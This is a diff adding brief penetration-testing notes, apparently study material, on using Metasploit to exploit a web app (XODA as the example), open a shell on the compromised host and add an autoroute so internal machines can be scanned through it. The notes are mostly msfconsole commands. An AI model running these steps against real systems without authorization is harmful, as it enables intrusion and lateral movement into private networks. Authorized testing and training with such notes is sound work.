@@ -1,0 +1,29 @@
+In the case of some networks, if you have a foothold on one target you may discover there are other targets connected to that initial footholds local network, in this case it is not possible to scan them from your machine and so you will have to get the foothold to scan the other machines connected to it locally. With this we can connect to them via pivoting / adding a route and MSFconsole can help us with this.
+
+service postgresql start
+db_status
+workspace -a Port_Scan
+search portscan (shows you your options)
+5 will be the first one
+search udp_sweep (this is also a good scan to use)
+
+If you find that port 80 is open, you can curl the ip to get the webpage details
+curl <ip> 
+<title>APPLICATION</title> inbetween these two titles you can see what the webapp might be running
+you can then search for any exploits for this application, in this case we will use XODA as an example
+search xoda
+SET TARGETURI / (root of the webserver, change if needed)
+
+sysinfo
+**Now we need to get the network info of this target to progress and check if other machines are here**
+shell (or use windows command if this is a windows machine)
+/bin/bash -i 
+ifconfig
+
+**You can now add the route to meterpreter session**
+run autoroute -s <targets network, eth1 or eth0>
+background (puts your meterpreter session in the background and returns you to msfconsole)
+search portscan
+use 5
+set RHOSTS <targets local network>
+search udp_sweep (this is also a good scan to use)
